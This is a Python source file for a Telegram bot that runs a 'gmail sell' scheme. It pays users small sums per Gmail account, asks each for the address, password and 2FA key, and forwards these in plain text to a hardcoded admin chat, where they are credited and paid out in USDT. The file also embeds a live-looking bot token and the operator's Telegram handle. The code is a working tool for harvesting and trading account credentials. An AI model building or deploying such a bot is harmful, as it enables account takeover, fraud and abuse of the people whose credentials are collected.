import logging
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ReplyKeyboardMarkup,
    KeyboardButton
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    ContextTypes,
    filters
)

# ----------------- CONFIGURATION -----------------
BOT_TOKEN = "8710136196:AAFX9LodA6fadXsph4n04wt1Zv6r7ln1mlQ"          # Change this to your BotFather token
ADMIN_ID =   6112720850                         # Change this to your Telegram Numeric ID
REQUIRED_CHANNEL = "@googlejobhubsudeb"      # Change this to your Channel username (with @)
TUTORIAL_VIDEO_URL = "https://t.me/googlejobhubsudeb/3415"  # Change this to your Tutorial video link

# Setup logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)

# ----------------- DATABASE (In-Memory) -----------------
users_db = {}
tasks_db = {}
task_counter = 1000

# Conversation States
GMAIL, PASSWORD, TWO_FA = range(3)
USDT_AMOUNT, USDT_ADDRESS = range(3, 5)
BC_MSG, BC_IMG = range(5, 7)

# ----------------- KEYBOARDS -----------------
MAIN_MENU = ReplyKeyboardMarkup([
    [KeyboardButton("𝟭) 𝗧𝗮𝘀𝗸"), KeyboardButton("𝟮) 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗵𝗶𝘀𝘁𝗼𝗿𝘆")],
    [KeyboardButton("𝟯) 𝗕𝗮𝗹𝗮𝗻𝗰𝗲"), KeyboardButton("𝟰) 𝗪𝗶𝘁𝗵𝗱𝗿𝗮𝘄𝗮𝗹")],
    [KeyboardButton("𝟱) 𝗦𝘂𝗽𝗽𝗼𝗿𝘁")]
], resize_keyboard=True)

def get_sub_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 ✅", url=f"https://t.me/{REQUIRED_CHANNEL.replace('@', '')}")],
        [InlineKeyboardButton("𝗖𝗵𝗲𝗰𝗸 𝗝𝗼𝗶𝗻𝗲𝗱 🔄", callback_data="check_join")]
    ])

# ----------------- HELPER FUNCTIONS -----------------
async def is_subscribed(bot, user_id):
    try:
        member = await bot.get_chat_member(chat_id=REQUIRED_CHANNEL, user_id=user_id)
        return member.status in ["member", "administrator", "creator"]
    except Exception:
        return False

def init_user(user_id):
    if user_id not in users_db:
        users_db[user_id] = {"balance": 0.0, "tasks": []}

# ----------------- START & VERIFICATION -----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    init_user(user_id)
    
    if not await is_subscribed(context.bot, user_id):
        await update.message.reply_text(
            "⚠️ 𝗬𝗼𝘂 𝗺𝘂𝘀𝘁 𝗷𝗼𝗶𝗻 𝗼𝘂𝗿 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁!",
            reply_markup=get_sub_keyboard()
        )
        return

    welcome_text = (
        "𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗼𝘂𝗿 𝗴𝗺𝗮𝗶𝗹 𝘀𝗲𝗹𝗹 𝗯𝗼𝘁 🤑🤑\n\n"
        "𝗘𝗮𝗿𝗻 𝗲𝘃𝗲𝗿𝘆 𝗴𝗺𝗮𝗶𝗹 𝟎.𝟑𝟐$ 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅️\n"
        "𝟏 𝗬𝗲𝗮𝗿 𝗼𝗹𝗱 𝗴𝗺𝗮𝗶𝗹 𝗴𝗲𝘁 𝟎.𝟑𝟕$ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅️"
    )
    tutorial_btn = InlineKeyboardMarkup([
        [InlineKeyboardButton("𝗖𝗹𝗶𝗰𝗸 𝗵𝗲𝗿𝗲 𝘁𝗼 𝗴𝗲𝘁 𝘁𝘂𝘁𝗼𝗿𝗶𝗮𝗹 🎥", url=TUTORIAL_VIDEO_URL)]
    ])
    
    await update.message.reply_text(welcome_text, reply_markup=tutorial_btn)
    await update.message.reply_text("𝗦𝗲𝗹𝗲𝗰𝘁 𝗮𝗻 𝗼𝗽𝘁𝗶𝗼𝗻 𝗳𝗿𝗼𝗺 𝗯𝗲𝗹𝗼𝘄 𝗺𝗲𝗻𝘂:", reply_markup=MAIN_MENU)

async def check_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if await is_subscribed(context.bot, user_id):
        await query.message.delete()
        welcome_text = (
            "𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗼𝘂𝗿 𝗴𝗺𝗮𝗶𝗹 𝘀𝗲𝗹𝗹 𝗯𝗼𝘁 🤑🤑\n\n"
            "𝗘𝗮𝗿𝗻 𝗲𝘃𝗲𝗿𝘆 𝗴𝗺𝗮𝗶𝗹 𝟎.𝟑𝟐$ 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅️\n"
            "𝟏 𝗬𝗲𝗮𝗿 𝗼𝗹𝗱 𝗴𝗺𝗮𝗶𝗹 𝗴𝗲𝘁 𝟎.𝟑𝟕$ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅️"
        )
        tutorial_btn = InlineKeyboardMarkup([
            [InlineKeyboardButton("𝗖𝗹𝗶𝗰𝗸 𝗵𝗲𝗿𝗲 𝘁𝗼 𝗴𝗲𝘁 𝘁𝘂𝘁𝗼𝗿𝗶𝗮𝗹 🎥", url=TUTORIAL_VIDEO_URL)]
        ])
        await query.message.reply_text(welcome_text, reply_markup=tutorial_btn)
        await query.message.reply_text("𝗦𝗲𝗹𝗲𝗰𝘁 𝗮𝗻 𝗼𝗽𝘁𝗶𝗼𝗻 𝗳𝗿𝗼𝗺 𝗯𝗲𝗹𝗼𝘄 𝗺𝗲𝗻𝘂:", reply_markup=MAIN_MENU)
    else:
        await query.message.reply_text("❌ 𝗬𝗼𝘂 𝗵𝗮𝘃𝗲 𝗻𝗼𝘁 𝗷𝗼𝗶𝗻𝗲𝗱 𝘆𝗲𝘁! 𝗣𝗹𝗲𝗮𝘀𝗲 𝗷𝗼𝗶𝗻 𝗳𝗶𝗿𝘀𝘁.", reply_markup=get_sub_keyboard())

# ----------------- TASK FLOW -----------------
async def start_task(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not await is_subscribed(context.bot, user_id):
        await update.message.reply_text("⚠️ 𝗬𝗼𝘂 𝗺𝘂𝘀𝘁 𝗷𝗼𝗶𝗻 𝗼𝘂𝗿 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗳𝗶𝗿𝘀𝘁!", reply_markup=get_sub_keyboard())
        return ConversationHandler.END

    await update.message.reply_text("✉️ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝘆𝗼𝘂𝗿 𝗚𝗺𝗮𝗶𝗹 𝗮𝗱𝗱𝗿𝗲𝘀𝘀:")
    return GMAIL

async def get_task_gmail(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["gmail"] = update.message.text.strip()
    await update.message.reply_text("🔑 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝘆𝗼𝘂𝗿 𝗚𝗺𝗮𝗶𝗹 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱:")
    return PASSWORD

async def get_task_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["password"] = update.message.text.strip()
    
    two_fa_btn = InlineKeyboardMarkup([
        [InlineKeyboardButton("𝗛𝗼𝘄 𝘁𝗼 𝘀𝗲𝘁 𝟮𝗙𝗔 ❓", url=TUTORIAL_VIDEO_URL)]
    ])
    await update.message.reply_text("🛡️ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝘆𝗼𝘂𝗿 𝗚𝗺𝗮𝗶𝗹 𝟮𝗙𝗔 𝗸𝗲𝘆:", reply_markup=two_fa_btn)
    return TWO_FA

async def get_task_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global task_counter
    user_id = update.effective_user.id
    two_fa = update.message.text.strip()
    gmail = context.user_data["gmail"]
    password = context.user_data["password"]

    task_id = str(task_counter)
    task_counter += 1

    tasks_db[task_id] = {
        "user_id": user_id,
        "gmail": gmail,
        "pass": password,
        "2fa": two_fa,
        "status": "Pending"
    }
    users_db[user_id]["tasks"].append(task_id)

    await update.message.reply_text(
        f"✅ 𝗧𝗵𝗮𝗻𝗸𝘀 𝗳𝗼𝗿 𝘆𝗼𝘂𝗿 𝘀𝘂𝗯𝗺𝗶𝘀𝘀𝗶𝗼𝗻!\n\n"
        f"🆔 𝗧𝗮𝘀𝗸 𝗜𝗗: `{task_id}`\n"
        f"⏳ 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗣𝗲𝗻𝗱𝗶𝗻𝗴 𝗔𝗽𝗽𝗿𝗼𝘃𝗮𝗹",
        parse_mode="Markdown"
    )

    admin_markup = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("✅ 𝗔𝗰𝗰𝗲𝗽𝘁", callback_data=f"adm_accept_{task_id}"),
            InlineKeyboardButton("❌ 𝗥𝗲𝗷𝗲𝗰𝘁", callback_data=f"adm_reject_{task_id}")
        ]
    ])
    admin_msg = (
        f"📥 𝗡𝗲𝘄 𝗧𝗮𝘀𝗸 𝗦𝘂𝗯𝗺𝗶𝘀𝘀𝗶𝗼𝗻\n\n"
        f"🆔 𝗧𝗮𝘀𝗸 𝗜𝗗: `{task_id}`\n"
        f"👤 𝗨𝘀𝗲𝗿 𝗜𝗗: `{user_id}`\n"
        f"✉️ 𝗚𝗺𝗮𝗶𝗹: `{gmail}`\n"
        f"🔑 𝗣𝗮𝘀𝘀: `{password}`\n"
        f"🛡️ 𝟮𝗙𝗔: `{two_fa}`"
    )
    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg, parse_mode="Markdown", reply_markup=admin_markup)
    return ConversationHandler.END

# ----------------- ADMIN ACTIONS -----------------
async def admin_task_actions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data.startswith("adm_accept_"):
        task_id = data.replace("adm_accept_", "")
        rates_markup = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("➕ $𝟬.𝟯𝟮", callback_data=f"pay_0.32_{task_id}"),
                InlineKeyboardButton("➕ $𝟬.𝟯𝟳", callback_data=f"pay_0.37_{task_id}")
            ]
        ])
        await query.message.edit_text(
            f"{query.message.text}\n\n👉 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮𝗺𝗼𝘂𝗻𝘁 𝘁𝗼 𝗰𝗿𝗲𝗱𝗶𝘁 𝘂𝘀𝗲𝗿:",
            reply_markup=rates_markup,
            parse_mode="Markdown"
        )

    elif data.startswith("pay_"):
        _, amount_str, task_id = data.split("_")
        amount = float(amount_str)
        task = tasks_db.get(task_id)

        if task and task["status"] == "Pending":
            task["status"] = "Accepted"
            user_id = task["user_id"]
            users_db[user_id]["balance"] += amount
            
            await query.message.edit_text(
                f"{query.message.text}\n\n✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝘄𝗶𝘁𝗵 ${amount}",
                parse_mode="Markdown"
            )
            await context.bot.send_message(
                chat_id=user_id,
                text=f"🎉 𝗬𝗼𝘂𝗿 𝘁𝗮𝘀𝗸 #{task_id} 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱!\n💰 ${amount} 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗮𝗱𝗱𝗲𝗱 𝘁𝗼 𝘆𝗼𝘂𝗿 𝗯𝗮𝗹𝗮𝗻𝗰𝗲."
            )

    elif data.startswith("adm_reject_"):
        task_id = data.replace("adm_reject_", "")
        task = tasks_db.get(task_id)

        if task and task["status"] == "Pending":
            task["status"] = "Rejected"
            user_id = task["user_id"]
            
            await query.message.edit_text(
                f"{query.message.text}\n\n❌ 𝗧𝗮𝘀𝗸 𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱",
                parse_mode="Markdown"
            )
            await context.bot.send_message(
                chat_id=user_id,
                text="❌ 𝗬𝗼𝘂 𝘁𝗮𝘀𝗸 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝗲𝗷𝗲𝗰𝘁𝗲𝗱 𝗽𝗹𝗲𝗮𝘀𝗲 𝗰𝗼𝗻𝘁𝗮𝗰𝘁 𝗼𝘂𝗿 𝗮𝗱𝗺𝗶𝗻 𝗳𝗼𝗿 𝗮𝗽𝗽𝗿𝗼𝘃𝗲 @SUDEBNOMERCY"
            )

# ----------------- MENU HANDLERS -----------------
async def handle_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user_id = update.effective_user.id
    init_user(user_id)

    if text == "𝟮) 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗵𝗶𝘀𝘁𝗼𝗿𝘆":
        user_tasks = users_db[user_id]["tasks"]
        if not user_tasks:
            await update.message.reply_text("📑 𝗡𝗼 𝘀𝘂𝗯𝗺𝗶𝘀𝘀𝗶𝗼𝗻 𝗵𝗶𝘀𝘁𝗼𝗿𝘆 𝗳𝗼𝘂𝗻𝗱.")
            return

        msg = "📑 𝗬𝗼𝘂𝗿 𝗦𝘂𝗯𝗺𝗶𝘀𝘀𝗶𝗼𝗻 𝗛𝗶𝘀𝘁𝗼𝗿𝘆:\n\n"
        for tid in user_tasks:
            t = tasks_db[tid]
            status_icon = "⏳" if t["status"] == "Pending" else ("✅" if t["status"] == "Accepted" else "❌")
            msg += (
                f"🆔 𝗧𝗮𝘀𝗸 𝗜𝗗: `{tid}`\n"
                f"✉️ 𝗚𝗺𝗮𝗶𝗹: `{t['gmail']}`\n"
                f"🔑 𝗣𝗮𝘀𝘀: `{t['pass']}`\n"
                f"🛡️ 𝟮𝗙𝗔: `{t['2fa']}`\n"
                f"📊 𝗦𝘁𝗮𝘁𝘂𝘀: {status_icon} {t['status']}\n"
                f"-----------------------------\n"
            )
        await update.message.reply_text(msg, parse_mode="Markdown")

    elif text == "𝟯) 𝗕𝗮𝗹𝗮𝗻𝗰𝗲":
        bal = users_db[user_id]["balance"]
        await update.message.reply_text(f"💰 𝗬𝗼𝘂𝗿 𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗕𝗮𝗹𝗮𝗻𝗰𝗲: *${bal:.2f}*", parse_mode="Markdown")

    elif text == "𝟰) 𝗪𝗶𝘁𝗵𝗱𝗿𝗮𝘄𝗮𝗹":
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("💵 𝗨𝗦𝗗𝗧 (𝗕𝗘𝗣𝟮𝟬)", callback_data="w_usdt")],
            [InlineKeyboardButton("💳 𝗨𝗣𝗜", callback_data="w_upi")]
        ])
        await update.message.reply_text("💳 𝗦𝗲𝗹𝗲𝗰𝘁 𝘆𝗼𝘂𝗿 𝘄𝗶𝘁𝗵𝗱𝗿𝗮𝘄𝗮𝗹 𝗺𝗲𝘁𝗵𝗼𝗱:", reply_markup=keyboard)

    elif text == "𝟱) 𝗦𝘂𝗽𝗽𝗼𝗿𝘁":
        await update.message.reply_text("📞 𝗙𝗼𝗿 𝗮𝗻𝘆 𝗵𝗲𝗹𝗽 𝗼𝗿 𝘀𝘂𝗽𝗽𝗼𝗿𝘁, 𝗰𝗼𝗻𝘁𝗮𝗰𝘁 𝗮𝗱𝗺𝗶𝗻: @SUDEBNOMERCY")

# ----------------- WITHDRAWAL FLOW -----------------
async def handle_withdrawal_choice(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "w_upi":
        await query.message.reply_text("𝗙𝗼𝗿 𝘂𝗽𝗶 𝘁𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝘆𝗼𝘂 𝗺𝘂𝘀𝘁 𝗵𝗮𝘃𝗲 𝘁𝗼 𝗰𝗼𝗻𝘁𝗮𝗰𝘁 𝗮𝗱𝗺𝗶𝗻 @SUDEBNOMERCY")
    elif query.data == "w_usdt":
        user_id = query.from_user.id
        if users_db[user_id]["balance"] < 0.32:
            await query.message.reply_text("⚠️ 𝗠𝗶𝗻𝗶𝗺𝘂𝗺 𝘄𝗶𝘁𝗵𝗱𝗿𝗮𝘄𝗮𝗹 𝗮𝗺𝗼𝘂𝗻𝘁 𝗶𝘀 $𝟬.𝟯𝟮")
            return
        await query.message.reply_text("💵 𝗘𝗻𝘁𝗲𝗿 𝘄𝗶𝘁𝗵𝗱𝗿𝗮𝘄𝗮𝗹 𝗮𝗺𝗼𝘂𝗻𝘁 (𝗠𝗶𝗻𝗶𝗺𝘂𝗺 $𝟬.𝟯𝟮):")
        return USDT_AMOUNT

async def get_usdt_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    try:
        amount = float(update.message.text.strip())
        if amount < 0.32:
            await update.message.reply_text("⚠️ 𝗠𝗶𝗻𝗶𝗺𝘂𝗺 𝘄𝗶𝘁𝗵𝗱𝗿𝗮𝘄𝗮𝗹 𝗶𝘀 $𝟬.𝟯𝟮. 𝗧𝗿𝘆 𝗮𝗴𝗮𝗶𝗻:")
            return USDT_AMOUNT
        if amount > users_db[user_id]["balance"]:
            await update.message.reply_text("❌ 𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗯𝗮𝗹𝗮𝗻𝗰𝗲. 𝗧𝗿𝘆 𝗮𝗴𝗮𝗶𝗻:")
            return USDT_AMOUNT

        context.user_data["w_amount"] = amount
        await update.message.reply_text("📍 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝘆𝗼𝘂𝗿 𝗨𝗦𝗗𝗧 𝗕𝗘𝗣𝟮𝟬 𝘄𝗮𝗹𝗹𝗲𝘁 𝗮𝗱𝗱𝗿𝗲𝘀𝘀:")
        return USDT_ADDRESS
    except ValueError:
        await update.message.reply_text("⚠️ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿:")
        return USDT_AMOUNT

async def get_usdt_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    address = update.message.text.strip()
    amount = context.user_data["w_amount"]

    users_db[user_id]["balance"] -= amount

    await update.message.reply_text(
        f"✅ 𝗪𝗶𝘁𝗵𝗱𝗿𝗮𝘄𝗮𝗹 𝗿𝗲𝗾𝘂𝗲𝘀𝘁 𝘀𝘂𝗯𝗺𝗶𝘁𝘁𝗲𝗱!\n\n"
        f"💰 𝗔𝗺𝗼𝘂𝗻𝘁: ${amount}\n"
        f"📍 𝗔𝗱𝗱𝗿𝗲𝘀𝘀: `{address}`\n"
        f"⏳ 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 𝗳𝗼𝗿 𝗮𝗱𝗺𝗶𝗻 𝗽𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴.",
        parse_mode="Markdown"
    )

    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=(
            f"🚨 𝗡𝗲𝘄 𝗨𝗦𝗗𝗧 𝗪𝗶𝘁𝗵𝗱𝗿𝗮𝘄𝗮𝗹 𝗥𝗲𝗾𝘂𝗲𝘀𝘁\n\n"
            f"👤 𝗨𝘀𝗲𝗿 𝗜𝗗: `{user_id}`\n"
            f"💰 𝗔𝗺𝗼𝘂𝗻𝘁: `${amount}`\n"
            f"📍 𝗕𝗘𝗣𝟮𝟬 𝗔𝗱𝗱𝗿𝗲𝘀𝘀: `{address}`"
        ),
        parse_mode="Markdown"
    )
    return ConversationHandler.END

# ----------------- ADMIN COMMANDS -----------------
async def admin_add_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        _, uid, amt = update.message.text.split()
        uid, amt = int(uid), float(amt)
        init_user(uid)
        users_db[uid]["balance"] += amt
        await update.message.reply_text(f"✅ 𝗔𝗱𝗱𝗲𝗱 ${amt} 𝘁𝗼 𝘂𝘀𝗲𝗿 `{uid}`. 𝗡𝗲𝘄 𝗕𝗮𝗹𝗮𝗻𝗰𝗲: ${users_db[uid]['balance']:.2f}")
        await context.bot.send_message(chat_id=uid, text=f"💰 ${amt} 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗮𝗱𝗱𝗲𝗱 𝘁𝗼 𝘆𝗼𝘂𝗿 𝗯𝗮𝗹𝗮𝗻𝗰𝗲 𝗯𝘆 𝗮𝗱𝗺𝗶𝗻.")
    except Exception:
        await update.message.reply_text("⚠️ 𝗨𝘀𝗮𝗴𝗲: `/addbal <user_id> <amount>`")

async def admin_remove_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        _, uid, amt = update.message.text.split()
        uid, amt = int(uid), float(amt)
        init_user(uid)
        users_db[uid]["balance"] = max(0.0, users_db[uid]["balance"] - amt)
        await update.message.reply_text(f"✅ 𝗥𝗲𝗺𝗼𝘃𝗲𝗱 ${amt} 𝗳𝗿𝗼𝗺 𝘂𝘀𝗲𝗿 `{uid}`. 𝗡𝗲𝘄 𝗕𝗮𝗹𝗮𝗻𝗰𝗲: ${users_db[uid]['balance']:.2f}")
    except Exception:
        await update.message.reply_text("⚠️ 𝗨𝘀𝗮𝗴𝗲: `/removebal <user_id> <amount>`")

# ----------------- BROADCAST -----------------
async def broadcast_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return ConversationHandler.END
    await update.message.reply_text("📢 𝗦𝗲𝗻𝗱 𝗺𝗲 𝘁𝗵𝗲 𝗽𝗿𝗼𝗺𝗼𝘁𝗶𝗼𝗻𝗮𝗹 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝗼𝗿 𝗰𝗮𝗽𝘁𝗶𝗼𝗻:")
    return BC_MSG

async def broadcast_get_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["bc_text"] = update.message.text
    await update.message.reply_text("🖼️ 𝗦𝗲𝗻𝗱 𝗺𝗲 𝘁𝗵𝗲 𝗶𝗺𝗮𝗴𝗲 (𝗼𝗿 𝘁𝘆𝗽𝗲 '𝘀𝗸𝗶𝗽' 𝘁𝗼 𝘀𝗲𝗻𝗱 𝘁𝗲𝘅𝘁 𝗼𝗻𝗹𝘆):")
    return BC_IMG

async def broadcast_send(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = context.user_data.get("bc_text", "")
    photo = update.message.photo[-1].file_id if update.message.photo else None
    
    count = 0
    for uid in users_db.keys():
        try:
            if photo:
                await context.bot.send_photo(chat_id=uid, photo=photo, caption=text)
            else:
                await context.bot.send_message(chat_id=uid, text=text)
            count += 1
        except Exception:
            continue

    await update.message.reply_text(f"✅ 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 𝘀𝗲𝗻𝘁 𝘁𝗼 {count} 𝘂𝘀𝗲𝗿𝘀.")
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ 𝗢𝗽𝗲𝗿𝗮𝘁𝗶𝗼𝗻 𝗰𝗮𝗻𝗰𝗲𝗹𝗹𝗲𝗱.")
    return ConversationHandler.END

# ----------------- MAIN APP -----------------
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    task_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^𝟭\) 𝗧𝗮𝘀𝗸$"), start_task)],
        states={
            GMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_task_gmail)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_task_password)],
            TWO_FA: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_task_2fa)],
        },
        fallbacks=[CommandHandler("cancel", cancel)]
    )

    usdt_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(handle_withdrawal_choice, pattern="^w_usdt$")],
        states={
            USDT_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_usdt_amount)],
            USDT_ADDRESS: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_usdt_address)],
        },
        fallbacks=[CommandHandler("cancel", cancel)]
    )

    bc_conv = ConversationHandler(
        entry_points=[CommandHandler("broadcast", broadcast_start)],
        states={
            BC_MSG: [MessageHandler(filters.TEXT & ~filters.COMMAND, broadcast_get_msg)],
            BC_IMG: [
                MessageHandler(filters.PHOTO, broadcast_send),
                MessageHandler(filters.Regex("(?i)^skip$"), broadcast_send)
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel)]
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("addbal", admin_add_balance))
    app.add_handler(CommandHandler("removebal", admin_remove_balance))
    app.add_handler(CallbackQueryHandler(check_join_callback, pattern="^check_join$"))
    app.add_handler(CallbackQueryHandler(admin_task_actions, pattern="^(adm_|pay_)"))
    app.add_handler(CallbackQueryHandler(handle_withdrawal_choice, pattern="^w_upi$"))
    app.add_handler(task_conv)
    app.add_handler(usdt_conv)
    app.add_handler(bc_conv)
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_menu))

    print("Bot is starting...")
    app.run_polling()

if __name__ == "__main__":
    main()
